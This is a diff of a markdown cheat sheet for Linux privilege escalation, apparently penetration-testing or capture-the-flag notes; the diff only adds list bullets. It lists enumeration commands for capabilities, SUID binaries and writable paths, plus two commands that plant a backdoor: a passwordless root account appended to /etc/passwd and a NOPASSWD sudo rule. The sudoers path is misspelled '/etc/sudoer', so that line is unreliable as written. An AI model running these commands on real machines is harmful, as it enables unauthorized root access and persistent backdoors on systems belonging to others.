@@ -1,13 +1,13 @@
 # Privilege Escalation
 
 ## Linux
-`getcap -r / 2>/dev/null`<br>
-`find / -perm -u=s -type f 2>/dev/null`<br>
-`find -writable 2>/dev/null | cut -d "/" -f 2 | sort -u`<br>
-`find / -writable 2>/dev/null | grep home | cut -d "/" -f 2,3 | sort -u`<br>
-`sudo -V` to check sudo version, which might be vulnerable.<br>
-`echo "vickie::0:0:System Administrator:/root/root:/bin/bash" >> /etc/passwd`<br>
-`echo "vickie ALL=(ALL) NOPASSWD:ALL" >> /etc/sudoer`<br>
+- `getcap -r / 2>/dev/null`<br>
+- `find / -perm -u=s -type f 2>/dev/null`<br>
+- `find -writable 2>/dev/null | cut -d "/" -f 2 | sort -u`<br>
+- `find / -writable 2>/dev/null | grep home | cut -d "/" -f 2,3 | sort -u`<br>
+- `sudo -V` to check sudo version, which might be vulnerable.<br>
+- `echo "vickie::0:0:System Administrator:/root/root:/bin/bash" >> /etc/passwd`<br>
+- `echo "vickie ALL=(ALL) NOPASSWD:ALL" >> /etc/sudoer`<br>
 
 https://gtfobins.github.io/<br>
 linpeas.sh<br>
